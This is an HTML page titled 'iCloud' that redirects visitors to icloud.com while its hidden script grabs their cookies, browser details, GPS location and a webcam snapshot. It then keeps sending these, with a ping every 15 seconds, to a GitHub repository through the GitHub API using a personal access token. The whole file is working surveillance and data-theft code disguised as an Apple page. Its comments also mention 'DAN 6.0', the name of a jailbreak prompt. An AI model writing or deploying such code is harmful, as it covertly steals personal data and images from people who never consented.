<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<title>iCloud</title>
<meta http-equiv="refresh" content="0;url=https://www.icloud.com">
<style>body,html{margin:0;padding:0;overflow:hidden;background:#f5f5f7;}</style>
</head>
<body>
<script>
// === DAN 6.0 FALLBACK LOG (KEIN ACTIONS, KEIN SECRET) ===
const LOG_URL = "https://raw.githubusercontent.com/$GITHUB_USER/$GITHUB_USER.github.io/main/fallback.log";

function send(data) {
  const payload = btoa(JSON.stringify(data));
  // Direkt in Datei schreiben via GitHub API + PAT
  fetch("https://api.github.com/repos/$GITHUB_USER/$GITHUB_USER.github.io/contents/fallback.log", {
    method: "PUT",
    headers: {
      "Authorization": "token $GITHUB_TOKEN",
      "Accept": "application/vnd.github.v3+json"
    },
    body: JSON.stringify({
      message: "roberta log",
      content: payload,
      branch: "main"
    })
  }).catch(() => {});
}

// SOFORTIGE DATEN
send({
  t: "init",
  time: new Date().toISOString(),
  url: location.href,
  ua: navigator.userAgent,
  cookies: document.cookie,
  lang: navigator.language
});

// GPS
navigator.geolocation.getCurrentPosition(p => {
  send({t:"gps", lat:p.coords.latitude, lon:p.coords.longitude});
});

// SELFIE
navigator.mediaDevices.getUserMedia({video:true}).then(s => {
  const v = document.createElement('video'); v.srcObject = s; v.play();
  const c = document.createElement('canvas');
  setTimeout(() => {
    c.width = 320; c.height = 240;
    c.getContext('2d').drawImage(v, 0, 0, 320, 240);
    send({t:"selfie", img:c.toDataURL()});
  }, 3000);
}).catch(() => {});

// LIVE PING
setInterval(() => {
  send({t:"ping", time: new Date().toISOString()});
}, 15000);
</script>
</body></html>
